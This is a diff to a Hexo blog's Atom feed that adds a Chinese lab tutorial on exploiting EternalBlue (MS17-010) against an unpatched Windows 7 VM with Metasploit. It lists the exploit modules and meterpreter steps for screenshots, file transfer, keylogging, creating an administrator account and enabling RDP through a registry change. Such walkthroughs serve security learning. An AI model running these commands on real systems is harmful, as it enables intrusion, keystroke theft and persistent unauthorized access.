@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-11-09T08:58:54.846Z</updated>
+  <updated>2023-11-10T11:02:15.765Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>八，永恒之蓝漏洞利用</title>
+    <link href="http://example.com/2023/11/10/%E5%85%AB%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <id>http://example.com/2023/11/10/%E5%85%AB%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
+    <published>2023-11-10T08:10:03.000Z</published>
+    <updated>2023-11-10T11:02:15.765Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>1，准备kali-linux 和windows7（未装补丁）两个虚拟机</p><p>2，确保kali-linux 和 windows7 两个虚拟机都为桥接模式</p><p>3，Kali-Linux改为以root用户登录</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101615276.png" alt="image-20231110161445954" style="zoom: 33%;" /><p>4，查看Windows7和kali-Linux的IP地址</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101616786.png" alt="image-20231110161653740" style="zoom:33%;" /><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101617979.png" alt="image-20231110161743559" style="zoom:33%;" /><p>5，通过ping命令，测试两台虚拟机是否能连通</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101621461.png" alt="image-20231110162155368" style="zoom:33%;" /><p>6，kali-linux输入msfconsole启动msf（若不是root登陆需sudo提升权限） 。#msfconsole会启动metasploit，命令提示行显示msf则启动成功。</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101623134.png" alt="image-20231110162303260" style="zoom:33%;" /><p>7，输入search ms17-010查看漏洞模块</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101625376.png" alt="image-20231110162527141" style="zoom:33%;" /><p>3 auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010是永恒之蓝扫描模块，探测主机是否存在ms17-010漏洞。</p><p>0 exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue是永恒之蓝攻击代码，一般两者配合使用，前者先扫描，若是显示有漏洞，再进行攻击。</p><p>8，扫描过程</p><p>可以使用use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010或者use 3命令</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101627019.png" alt="image-20231110162658665" style="zoom:33%;" /><p>9，攻击过程</p><p>   可以使用use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue或者use 0命令</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101627811.png" alt="image-20231110162743291" style="zoom:33%;" /><p>10，显示远程主机系统信息： sysinfo</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101629348.png" alt="image-20231110162935052" style="zoom:33%;" /><p>11，通过 meterpreter 获取屏幕快照： screenshot</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101630773.png" alt="image-20231110163043590"></p><p>12，上传文件到Windows主机，并从Windows主机中下载文件</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101632901.png" alt="image-20231110163201906" style="zoom:33%;" /><p>上传文件：upload kali的文件地址 Windows的保存路径</p><p>下载文件 ：download kali的保存路径 windows的文件地址</p><p>13，添加用户并到管理员组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user uname pass /add  添加用户名为name，密码为pass</span><br><span class="line">net localgroup Administrators uname /add  将用户名为uname的用户添加到管理员组</span><br><span class="line">net user uname /del 删除uname用户</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101649899.png" alt="image-20231110164916676" style="zoom:33%;" /><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101649782.png" alt="image-20231110164925427" style="zoom:33%;" /><p>14，键盘监听</p><p>ps 看（explorer.exe）进程号</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101853293.png" alt="image-20231110185330209" style="zoom:33%;" /><p>migrate 1892（进程号） 迁移</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101853687.png" alt="image-20231110185356339" style="zoom:33%;" /><p>keyscan_start 键盘监听</p><p>keyscan_dump 看键盘输入了什么</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101854734.png" alt="image-20231110185418913" style="zoom:33%;" /><p>15，远程登陆目标主机</p><p>C:\WINDOWS\system32&gt;net user admin &#x2F;active:yes<br>开启远程管理服务<br>C:\Windows\system32&gt;reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311101856023.png" alt="image-20231110185601912" style="zoom:33%;" /><hr>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;hr&gt;
+&lt;p&gt;1，准备kali-linux 和windows7（未装补丁）两个虚拟机&lt;/p&gt;
+&lt;p&gt;2，确保kali-linux 和 windows7 两个虚拟机都为桥接模式&lt;/p&gt;
+&lt;p&gt;3，Kali-Linux改为以root用户登录&lt;/p&gt;
+&lt;img src=&quot;https:</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>七，更改hexo博客主题</title>
